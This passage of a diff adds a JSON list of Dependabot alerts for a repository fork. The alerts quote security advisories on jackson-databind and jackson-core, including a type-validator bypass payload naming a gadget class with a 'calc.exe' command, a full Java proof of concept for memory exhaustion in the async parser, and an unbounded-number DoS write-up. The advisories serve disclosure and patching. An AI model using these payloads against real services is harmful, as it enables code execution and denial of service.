+          "url": "https://access.redhat.com/errata/RHSA-2026:50848"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:50847"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:50846"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:54435"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:54622"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:62260"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:66488"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:66545"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-rmj7-2vxq-3g9f"
+        }
+      ],
+      "published_at": "2026-06-23T21:22:15Z",
+      "updated_at": "2026-09-11T15:33:29Z",
+      "withdrawn_at": null
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "com.fasterxml.jackson.core:jackson-databind"
+      },
+      "severity": "high",
+      "vulnerable_version_range": ">= 2.10.0, < 2.18.8",
+      "first_patched_version": {
+        "identifier": "2.18.8"
+      }
+    },
+    "url": "https://api.github.com/repos/dhasani23/dynamodb-kafka-konnect-fork/dependabot/alerts/5",
+    "html_url": "https://github.com/dhasani23/dynamodb-kafka-konnect-fork/security/dependabot/5",
+    "created_at": "2026-06-23T21:54:15Z",
+    "updated_at": "2026-06-23T21:54:15Z",
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 6,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "com.fasterxml.jackson.core:jackson-databind"
+      },
+      "manifest_path": "build.gradle.kts",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-j3rv-43j4-c7qm",
+      "cve_id": "CVE-2026-54512",
+      "summary": "jackson-databind has a PolymorphicTypeValidator bypass via generic type parameters that allows arbitrary class instantiation",
+      "description": "`jackson-databind`'s `PolymorphicTypeValidator` (PTV) is the primary safety mechanism guarding polymorphic deserialization. When polymorphic typing is enabled and a type identifier contains generic parameters (i.e. the type ID string contains `<`), `DatabindContext._resolveAndValidateGeneric()` validates **only the raw container class name** (the substring before `<`) against the configured PTV.\n\nIf the container type is approved, the method parses the full canonical type string via `TypeFactory.constructFromCanonical()` and returns the fully parameterized type **without ever validating the nested type arguments** against the PTV. The nested type arguments are then resolved, instantiated, and populated as beans during deserialization.\n\nAn attacker who controls the type ID can therefore place a denied class as a generic type parameter of an allowed container \u2014 for example `java.util.ArrayList<com.evil.Gadget>` when only `java.util.ArrayList` is allow-listed. The container passes the PTV check; `com.evil.Gadget` is loaded via `Class.forName(name, true, loader)`, instantiated, and its properties are set from attacker-controlled JSON. This completely bypasses an explicitly configured PTV allow-list.\n\nThis is the same vulnerability class responsible for the historical sequence of jackson-databind deserialization CVEs; here it manifests as a validator bypass rather than a missing deny-list entry.\n\n\n## Impact\n\n- **Bypass of the PTV allow-list**, including the recommended `BasicPolymorphicTypeValidator` configured with name-prefix allow rules.\n- **Arbitrary class instantiation** of any type assignable to the container's element/parameter position, with attacker-controlled property values (setter/field injection).\n- **Potential unauthenticated remote code execution** when a class with exploitable side effects (JNDI lookup, JDBC/connection-pool gadgets,`TemplatesImpl`-style loaders, etc.) is present on the classpath.\n\nApplications that accept untrusted JSON and rely on a configured PTV \u2014 the documented, security-conscious configuration \u2014 are affected.\n\n\n## Proof of Concept\n\nConfiguration restricting polymorphic deserialization to a single safe container:\n\n```java\nBasicPolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()\n        .allowIfSubType(\"java.util.ArrayList\")\n        .build();\n\nObjectMapper mapper = JsonMapper.builder()\n        .polymorphicTypeValidator(ptv)\n        .build();\n```\n\nMalicious payload (`Wrapper.value` is `Object` with `@JsonTypeInfo(use = Id.CLASS, include = As.WRAPPER_ARRAY)`):\n\n```json\n{\"value\":[\"java.util.ArrayList<com.evil.EvilGadget>\",[{\"cmd\":\"calc.exe\"}]]}\n```\n\nOn vulnerable versions, `com.evil.EvilGadget` is instantiated and its `cmd` property is set, despite only `java.util.ArrayList` being allow-listed. On `2.18.8` / `2.21.4` / `3.1.4` the deserialization throws `InvalidTypeIdException` before instantiation.\n\n**Variant payloads** (all bypass an `ArrayList`/`HashMap` allow-list):\n\n| Type ID | Smuggled type position |\n|---|---|\n| `java.util.ArrayList<Evil>` | list element |\n| `java.util.HashMap<Evil,String>` | map key |\n| `java.util.HashMap<String,Evil>` | map value |\n| `java.util.ArrayList<java.util.ArrayList<Evil>>` | nested element |\n| `java.util.ArrayList<Evil[]>` | array element |\n\n---\n\n## Patches\n\nFixed in **2.18.8**, **2.21.4** and **3.1.4** via the changes for [FasterXML/jackson-databind#5988](https://github.com/FasterXML/jackson-databind/issues/5988), commit `434d6c511`. The fix adds recursive validation of each non-trivial type parameter (and array element types appearing as parameters) through the full PTV chain, with documented exemptions for `Object` (wildcard resolution) and `Enum` types.\n\n`PolymorphicTypeValidator` was added in 2.10.0 so vulnerability N/A for versions prior to that.",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.10.0, <= 2.18.7",
+          "first_patched_version": {
+            "identifier": "2.18.8"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 3.0.0, <= 3.1.3",
+          "first_patched_version": {
+            "identifier": "3.1.4"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.19.0, <= 2.21.3",
+          "first_patched_version": {
+            "identifier": "2.21.4"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "tools.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 3.0.0, <= 3.1.3",
+          "first_patched_version": {
+            "identifier": "3.1.4"
+          }
+        }
+      ],
+      "severity": "high",
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 8.1
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "score": 8.1
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00999,
+        "percentile": 0.61518
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-184",
+          "name": "Incomplete List of Disallowed Inputs"
+        },
+        {
+          "cwe_id": "CWE-502",
+          "name": "Deserialization of Untrusted Data"
+        }
+      ],
+      "identifiers": [
+        {
+          "value": "GHSA-j3rv-43j4-c7qm",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-54512",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-j3rv-43j4-c7qm"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/issues/5988"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/commit/434d6c511de7fdd9872f29157aafb6162d12d8d5"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-54512"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-j3rv-43j4-c7qm"
+        }
+      ],
+      "published_at": "2026-06-23T21:21:38Z",
+      "updated_at": "2026-07-20T21:21:15Z",
+      "withdrawn_at": null
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "com.fasterxml.jackson.core:jackson-databind"
+      },
+      "severity": "high",
+      "vulnerable_version_range": ">= 2.10.0, <= 2.18.7",
+      "first_patched_version": {
+        "identifier": "2.18.8"
+      }
+    },
+    "url": "https://api.github.com/repos/dhasani23/dynamodb-kafka-konnect-fork/dependabot/alerts/6",
+    "html_url": "https://github.com/dhasani23/dynamodb-kafka-konnect-fork/security/dependabot/6",
+    "created_at": "2026-06-23T21:56:38Z",
+    "updated_at": "2026-06-23T21:56:38Z",
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 7,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "com.fasterxml.jackson.core:jackson-core"
+      },
+      "manifest_path": "build.gradle.kts",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-r7wm-3cxj-wff9",
+      "cve_id": "CVE-2026-68494",
+      "summary": "jackson-core: Async parser maxNumberLength bypass via chunked digit accumulation (incomplete fix for GHSA-72hv-8253-57qq)",
+      "description": "## Summary\n\nThe fix released in jackson-core `2.18.6` and `2.21.1` for [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-core/security/advisories/GHSA-72hv-8253-57qq) (Number Length Constraint Bypass in Async Parser, published 2026-02-28) is incomplete. The fix commit `b0c428e6` (#1555) wired `validateIntegerLength` into a new `_setIntLength` helper and called it at every place where the integer portion of a number is *decided* (terminator byte arrived, `.` / `e/E` seen, end-of-feed inside a fully-buffered value). It did not call it on the much more attacker-relevant path: \"ran out of input while still inside `MINOR_NUMBER_INTEGER_DIGITS`, return `NOT_AVAILABLE` to caller\".\n\nAs a result, an attacker who streams JSON to a non-blocking parser in many small chunks, without ever sending a terminator byte, can keep the parser inside `MINOR_NUMBER_INTEGER_DIGITS` indefinitely. `_textBuffer.expandCurrentSegment()` grows on every chunk, and `validateIntegerLength` is never invoked. The accumulator is only gated by `maxStringLength` (20 MiB default) \u2014 a **~20,000x amplification** of the documented `maxNumberLength` (1000 default).\n\nThis is the same vulnerability class, same advisory wording (\"Memory Exhaustion: Unbounded allocation in TextBuffer from excessively long numbers\"), same parser class \u2014 just the streaming path the original fix didn't cover. The fix to the *fraction* path is correct (see `_finishFloatFraction` at line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in 2.18.6, where `_setFractLength(fractLen)` IS called before the `NOT_AVAILABLE` return); the equivalent call is missing from every integer-digit path.\n\n## Affected versions\n\nVerified on the patched releases:\n- `com.fasterxml.jackson.core:jackson-core` **2.18.6**\n- `com.fasterxml.jackson.core:jackson-core` **2.21.1**\n\nStructurally identical code in `tools.jackson.core` 3.0.x / 3.1.x \u2014 same `NonBlockingUtf8JsonParserBase` class, same `_setIntLength` rollout, same NOT_AVAILABLE returns without validation. Not retested but presumed vulnerable.\n\n## Affected code\n\n[`src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java`](https://github.com/FasterXML/jackson-core/blob/b0c428e6/src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java) in 2.18.6 / 2.21.1.\n\n### Site 1 \u2014 `_startPositiveNumber(int ch)` lines 1320-1330:\n\n```java\nif (outPtr >= outBuf.length) {\n    // NOTE: must expand to ensure contents all in a single buffer (to keep\n    // other parts of parsing simpler)\n    outBuf = _textBuffer.expandCurrentSegment();\n}\noutBuf[outPtr++] = (char) ch;\nif (++_inputPtr >= _inputEnd) {\n    _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n    _textBuffer.setCurrentLength(outPtr);\n    return _updateTokenToNA();          // <-- no validateIntegerLength(outPtr)\n}\n```\n\n### Site 2 \u2014 `_finishNumberIntegralPart` lines 1691-1727:\n\n```java\nprotected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {\n    int negMod = _numberNegative ? -1 : 0;\n\n    while (true) {\n        if (_inputPtr >= _inputEnd) {\n            _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n            _textBuffer.setCurrentLength(outPtr);\n            return _updateTokenToNA();    // <-- no validateIntegerLength(outPtr + negMod)\n        }\n        int ch = getByteFromBuffer(_inputPtr) & 0xFF;\n        if (ch < INT_0) {\n            if (ch == INT_PERIOD) {\n                _setIntLength(outPtr+negMod);   // <-- validated here\n                ++_inputPtr;\n                return _startFloat(outBuf, outPtr, ch);\n            }\n            break;\n        }\n        if (ch > INT_9) {\n            if ((ch | 0x20) == INT_e) {\n                _setIntLength(outPtr+negMod);   // <-- validated here\n                ++_inputPtr;\n                return _startFloat(outBuf, outPtr, ch);\n            }\n            break;\n        }\n        ++_inputPtr;\n        if (outPtr >= outBuf.length) {\n            outBuf = _textBuffer.expandCurrentSegment();\n        }\n        outBuf[outPtr++] = (char) ch;\n    }\n    _setIntLength(outPtr+negMod);            // <-- validated here\n    _textBuffer.setCurrentLength(outPtr);\n    return _valueComplete(JsonToken.VALUE_NUMBER_INT);\n}\n```\n\nThe pattern recurs at lines 1297, 1329, 1343, 1365, 1395, 1409, 1437, 1467, 1481, 1586, 1644, 1698 \u2014 every \"ran out of input mid-integer\" exit returns to the caller without validating the accumulator length.\n\n### Compare with the fraction path that is correct\n\n`_finishFloatFraction` lines 1827-1838:\n\n```java\nwhile (loop) {\n    if (ch >= INT_0 && ch <= INT_9) {\n        ++fractLen;\n        if (outPtr >= outBuf.length) {\n            outBuf = _textBuffer.expandCurrentSegment();\n        }\n        outBuf[outPtr++] = (char) ch;\n        if (_inputPtr >= _inputEnd) {\n            _textBuffer.setCurrentLength(outPtr);\n            _setFractLength(fractLen);          // <-- VALIDATED\n            return JsonToken.NOT_AVAILABLE;\n        }\n        ch = getNextSignedByteFromBuffer();\n    }\n    ...\n}\n```\n\n## Impact\n\nReactive frameworks (Spring WebFlux / Reactor, Quarkus, Helidon, Vert.x JSON, anything wrapping `JsonFactory.createNonBlockingByteArrayParser()` or `createNonBlockingByteBufferParser()`) feed inbound HTTP/gRPC bytes to the async parser as they arrive. Operators who set `StreamReadConstraints.builder().maxNumberLength(N)` on the assumption that this caps memory per number value are not getting that guarantee in chunked-feed scenarios. The parser silently accumulates digits up to `maxStringLength` (20 MiB default) per concurrent connection. Multiply by attacker-controlled concurrency to OOM the JVM.\n\nThe synchronous parsers (`UTF8StreamJsonParser`, `ReaderBasedJsonParser`) and the async parser on *complete* input are not affected \u2014 those paths go through `_setIntLength` or `ParserBase._reportTooLongIntegral` correctly.\n\nCWE-770 (Allocation of Resources Without Limits or Throttling), CVSS roughly the same as the parent advisory (Network / Low complexity / High availability impact). The parent advisory was scored CVSS 8.7 High.\n\n## Proof of concept\n\nStandalone PoC, no Maven required:\n\n```\nmkdir poc && cd poc\ncurl -sLo jackson-core-2.18.6.jar https://repo1.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.18.6/jackson-core-2.18.6.jar\ncat > PoC.java <<'EOF'\nimport com.fasterxml.jackson.core.*;\nimport com.fasterxml.jackson.core.async.ByteArrayFeeder;\n\npublic class PoC {\n    public static void main(String[] args) throws Exception {\n        StreamReadConstraints strict = StreamReadConstraints.builder()\n                .maxNumberLength(1000)\n                .build();\n        JsonFactory f = new JsonFactoryBuilder()\n                .streamReadConstraints(strict)\n                .build();\n\n        // Sanity: synchronous parser rejects 5000-digit int.\n        try (JsonParser p = f.createParser(\"{\\\"v\\\":\" + \"1\".repeat(5000) + \"}\")) {\n            while (p.nextToken() != null) { /* drive */ }\n            System.out.println(\"[-] BUG ABSENT: sync parser accepted\");\n            return;\n        } catch (Exception e) {\n            System.out.println(\"[+] sync parser rejected 5000-digit int: \" + e.getClass().getSimpleName());\n        }\n\n        // Bug: async parser, chunked, no terminator.\n        JsonParser ap = f.createNonBlockingByteArrayParser();\n        ByteArrayFeeder feeder = (ByteArrayFeeder) ap;\n\n        byte[] preamble = \"{\\\"v\\\":\".getBytes(\"UTF-8\");\n        feeder.feedInput(preamble, 0, preamble.length);\n        while (ap.nextToken() != JsonToken.NOT_AVAILABLE) { /* drain */ }\n\n        byte[] digits = new byte[16 * 1024];\n        for (int i = 0; i < digits.length; i++) digits[i] = (byte) ('1' + (i % 9));\n\n        for (int c = 0; c < 600; c++) {\n            feeder.feedInput(digits, 0, digits.length);\n            JsonToken t = ap.nextToken();\n            if (t != JsonToken.NOT_AVAILABLE) {\n                System.out.println(\"[-] unexpected token: \" + t);\n                return;\n            }\n        }\n        System.out.println(\"[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000\");\n\n        // Closing the number now finally triggers the validator.\n        feeder.feedInput(\"}\".getBytes(\"UTF-8\"), 0, 1);\n        feeder.endOfInput();\n        try {\n            while (ap.nextToken() != null) { /* drive */ }\n        } catch (Exception e) {\n            System.out.println(\"[*] late rejection on close: \" + e.getMessage().split(\"\\n\")[0]);\n        }\n        ap.close();\n    }\n}\nEOF\njavac -cp jackson-core-2.18.6.jar PoC.java\njava -Xmx256m -cp jackson-core-2.18.6.jar:. PoC\n```\n\nObserved output against `jackson-core-2.18.6`:\n\n```\n[+] sync parser rejected 5000-digit int: StreamConstraintsException\n[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000\n[*] late rejection on close: Number value length (9830400) exceeds the maximum allowed (1000, from `StreamReadConstraints.getMaxNumberLength()`)\n```\n\nObserved output against `jackson-core-2.21.1`: identical.\n\nThe 9.83 MB figure is purely a function of the loop bound (600 chunks * 16 KiB). The actual ceiling is `maxStringLength = 20 MiB`. With the strict policy declared as `maxNumberLength = 1000`, the parser permits **9830x** more allocation than the policy allows. With `maxStringLength` left at the default 20 MiB, an attacker can drive a single connection to 40 MiB of `char[]` heap (chars are 2 bytes each) before the validator finally fires on terminator/`endOfInput()`. Multiply by concurrent connections.\n\n## End-to-end reproduction through real HTTP\n\nSupplements the standalone PoC with a running Spring Boot WebFlux server,\ndriving the same bug through the actual reactor-netty + Jackson2JsonDecoder\nstreaming-decode path that production reactive endpoints use.\n\nSetup:\n- Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14, reactor-netty 1.1.23)\n- jackson-databind 2.17.2, jackson-core overridden:\n  - VULN run: `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest published)\n  - PATCHED run: `2.18.8-SNAPSHOT` built from the fix branch\n- JVM: OpenJDK 17.0.18\n- Server `JsonFactory` configured with `StreamReadConstraints.builder().maxNumberLength(1000).build()`\n\nEndpoint under test exposes the `Flux<DataBuffer>` request body directly to\n`Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so the parser sees one\nHTTP chunk per `feedInput` (the same pattern used for any\n`@RequestBody Flux<...>` / streaming JSON decoder in WebFlux). A raw-socket\nHTTP/1.1 chunked client streams `{\"v\":1` then 250 chunks of 200 digit bytes\neach (50,000 digits total) at 20ms intervals, then writes the closing `}`.\n\nVULN \u2014 jackson-core 2.18.7:\n```\n[VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks; server still accepting\n[VULN-SMALLCHUNK] full POST sent (50000 digits). Response:\nHTTP/1.1 200 OK\nERR after 6548ms cause=com.fasterxml.jackson.core.exc.StreamConstraintsException:\n       Number value length (50000) exceeds the maximum allowed (1000, ...)\n```\nServer-side controller trace (250 DataBuffer arrivals elided):\n```\n[ctrl] DataBuffer arrived size=6   ms=39       <- '{\"v\":1'\n[ctrl] DataBuffer arrived size=200 ms=42\n...\n[ctrl] DataBuffer arrived size=199 ms=5993\n[ctrl] DataBuffer arrived size=1   ms=6518     <- closing '}'\n[ctrl] ERR after 6548ms ... Number value length (50000) exceeds ...\n```\nServer held all 50,000 digit characters in `_textBuffer` for 6.5 seconds with\n`maxNumberLength=1000` declared. The validator never fires during streaming;\nit only fires at value-completion when the closing `}` arrives.\n\nPATCHED \u2014 jackson-core 2.18.8-SNAPSHOT (fix branch):\n```\n[PATCHED-SMALLCHUNK] connection broke after 2801 digits at chunk 14: [Errno 32] Broken pipe\n[PATCHED-SMALLCHUNK] DONE: digits_sent=2801 status=connection-broke-mid-stream\n```\nServer-side controller trace:\n```\n[ctrl] DataBuffer arrived size=6   ms=129\n[ctrl] DataBuffer arrived size=200 ms=142\n[ctrl] DataBuffer arrived size=200 ms=142\n[ctrl] DataBuffer arrived size=200 ms=145\n[ctrl] DataBuffer arrived size=200 ms=146\n[ctrl] DataBuffer arrived size=200 ms=147\n[ctrl] ERR after 155ms ... Number value length (1001) exceeds the maximum allowed (1000, ...)\n```\nPatched server raises `StreamConstraintsException` at 155ms after only 5\nDataBuffers, exactly when the accumulated digit count crosses\n`maxNumberLength=1000`. The connection is reset mid-stream rather than the\nparser silently consuming the rest of the attacker's payload.\n\nSide-by-side:\n\n| Build | Chunks accepted before exception | Digits buffered | Time to detection |\n|---|---|---|---|\n| jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the configured limit) | 6,548ms \u2014 only at terminator |\n| 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms \u2014 moment threshold crossed |\n\nNote on the default `@RequestBody Mono<JsonNode>` path: that path cannot\ndistinguish the two builds because Spring's `decodeToMono` joins all\nDataBuffers into one before parsing. The exploitable shape is the\nstreaming-decode path (`Flux<JsonNode>` / `@RequestBody Flux<...>` /\nWebSocket / SSE / any direct `decoder.decode(Flux<DataBuffer>, ...)` call),\nwhich is also what `Jackson2Tokenizer` uses for any streaming JSON\ndeserialization in WebFlux and Quarkus reactive REST.\n\n## Suggested fix\n\nMirror the pattern already used in `_finishFloatFraction`. At every site that returns `_updateTokenToNA()` (or `JsonToken.NOT_AVAILABLE`) with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr + negMod)` first. Concretely, the diff to `NonBlockingUtf8JsonParserBase.java` would be:\n\n```diff\n     protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {\n         int negMod = _numberNegative ? -1 : 0;\n\n         while (true) {\n             if (_inputPtr >= _inputEnd) {\n                 _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n                 _textBuffer.setCurrentLength(outPtr);\n+                _streamReadConstraints.validateIntegerLength(outPtr + negMod);\n                 return _updateTokenToNA();\n             }\n```\n\nNote: `_setIntLength` itself can't be used as-is because it also assigns `_intLength`, and `_intLength` must not be set until the integer is truly complete (subsequent fraction handling reads `_intLength`). The minimal fix is to call only the validator, as shown.\n\nApply the same one-line insertion before each `return _updateTokenToNA();` that exits with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12 lines total).\n\nAlternatively, a heavier refactor: also gate `_textBuffer.expandCurrentSegment()` calls inside the digit-accumulation loops on `outPtr < maxNumberLength` so that the validator fires at the moment the buffer would be enlarged past the limit, rather than waiting for the next chunk boundary. Either approach is sufficient.\n\n## Credit\n\nReported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq.",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-core"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "< 2.18.8",
+          "first_patched_version": {
+            "identifier": "2.18.8"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-core"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.19.0, < 2.21.4",
+          "first_patched_version": {
+            "identifier": "2.21.4"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "tools.jackson.core:jackson-core"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 3.0.0, < 3.1.4",
+          "first_patched_version": {
+            "identifier": "3.1.4"
+          }
+        }
+      ],
+      "severity": "high",
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": 0.0
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "score": 8.7
+        }
+      },
+      "epss": {
+        "percentage": 0.00463,
+        "percentile": 0.38589
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-770",
+          "name": "Allocation of Resources Without Limits or Throttling"
+        }
+      ],
+      "identifiers": [
+        {
+          "value": "GHSA-r7wm-3cxj-wff9",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-68494",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/FasterXML/jackson-core/security/advisories/GHSA-r7wm-3cxj-wff9"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-core/pull/1611"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-core/commit/050b429804dce2a7e08f0be1b0b4c3d040fdb9cd"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-core/commit/4cdd529749da396cc7edf6d4a2aad41d47902641"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-core/commit/c5941e5aae7fd5aeac55d66933cfb82b9aabeef8"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-68494"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-r7wm-3cxj-wff9"
+        }
+      ],
+      "published_at": "2026-07-21T21:58:53Z",
+      "updated_at": "2026-10-02T23:08:42Z",
+      "withdrawn_at": null
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "com.fasterxml.jackson.core:jackson-core"
+      },
+      "severity": "high",
+      "vulnerable_version_range": "< 2.18.8",
+      "first_patched_version": {
+        "identifier": "2.18.8"
+      }
+    },
+    "url": "https://api.github.com/repos/dhasani23/dynamodb-kafka-konnect-fork/dependabot/alerts/7",
+    "html_url": "https://github.com/dhasani23/dynamodb-kafka-konnect-fork/security/dependabot/7",
+    "created_at": "2026-07-21T22:18:53Z",
+    "updated_at": "2026-07-21T22:18:53Z",
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 8,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "com.fasterxml.jackson.core:jackson-databind"
+      },
+      "manifest_path": "build.gradle.kts",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-q4xh-88c3-wmh7",
+      "cve_id": "CVE-2026-68497",
+      "summary": "jackson-databind: Duration XMLGregorianCalendar Unbounded Number Parse DoS",
+      "description": "### Summary\n`jackson-databind` 3.2.1 deserializes a JSON **string** bound to a `javax.xml.datatype.Duration` or `javax.xml.datatype.XMLGregorianCalendar` field by passing the raw string verbatim to `DatatypeFactory.newDuration(value)` / `newXMLGregorianCalendar(value)`. Per the XML-Schema lexical grammar these factory methods accept numeric components of arbitrary length, which the JDK materializes into `java.math.BigInteger` / `BigDecimal` using the native `BigInteger(String)` constructor (an O(n\u00b2) parser). Because the digits reside inside a JSON **string** token, jackson-core's `StreamReadConstraints.maxNumberLength` guard (which bounds only JSON *number* tokens) never fires, so there is no length limit anywhere on this path. An unauthenticated attacker can submit a single small request (e.g. ~1\u20135 MB) that forces tens of seconds to minutes of single-thread CPU consumption, yielding a denial of service under the default `JsonMapper.builder().build()` mapper with no polymorphic typing or special configuration.\n\n### Details\n`StreamReadConstraints.maxNumberLength` (jackson-core, default 1000) bounds the **text length of JSON number tokens** only; it does not apply to digits inside a JSON string token (`maxStringLength` default is 100,000,000). jackson's own value binders compensate for this gap elsewhere \u2014 `NumberDeserializers` explicitly call `streamReadConstraints().validateIntegerLength(text.length())` / `validateFPLength(text.length())` before parsing a *stringified* number (`NumberDeserializers.java:1063`, `:1139`). The XML-datatype deserializer omits this identical pre-check.\n\n`CoreXMLDeserializers` registers `Std` deserializers **by default** for any field typed `javax.xml.datatype.Duration` or `XMLGregorianCalendar` (`findBeanDeserializer`), with no opt-in required. `Std._deserialize` hands the attacker string straight to the datatype factory:\n\n```java\nprotected Object _deserialize(String value, DeserializationContext ctxt) {\n    switch (_kind) {\n    case TYPE_DURATION:\n        return _dataTypeFactory.newDuration(value);                 // attacker lexical string\n    case TYPE_G_CALENDAR:\n        Date d;\n        try { d = _parseDate(value, ctxt); }\n        catch (DatabindException e) {\n            return _dataTypeFactory.newXMLGregorianCalendar(value); // attacker lexical string\n        }\n        return _gregorianFromDate(ctxt, d);\n    }\n    throw new IllegalStateException();\n}\n```\n\nPer the XSD lexical rules, `newDuration` parses each numeric component (years, months, \u2026) into a `BigInteger`, and `newXMLGregorianCalendar` parses fractional seconds into a `BigDecimal`. The JDK uses the native `BigInteger(String)` / `BigDecimal(String)` constructors, which are O(n\u00b2) in the digit count. A short JSON string such as `\"P\" + \"9\"\u00d7N + \"Y\"` therefore forces the allocation and O(N\u00b2) parse of an N-digit `BigInteger`, entirely downstream of every jackson-core constraint.\n\n## Vulnerable Code Location\n\n- `src/main/java/tools/jackson/databind/ext/CoreXMLDeserializers.java:137`\n  \u2014 `newDuration(value)` (TYPE_DURATION)\n- `src/main/java/tools/jackson/databind/ext/CoreXMLDeserializers.java:147`\n  \u2014 `newXMLGregorianCalendar(value)` (TYPE_G_CALENDAR fallback)\n- Registration (default, no opt-in):\n  `src/main/java/tools/jackson/databind/ext/CoreXMLDeserializers.java:42-46`\n  (`findBeanDeserializer` returns `Std` for `XMLGregorianCalendar` / `Duration`)\n- Contrast \u2014 correct length-guard pattern already used elsewhere in the library:\n  `src/main/java/tools/jackson/databind/deser/jdk/NumberDeserializers.java:1063,1139`\n\n## Proof of Concept\n\nPoC source 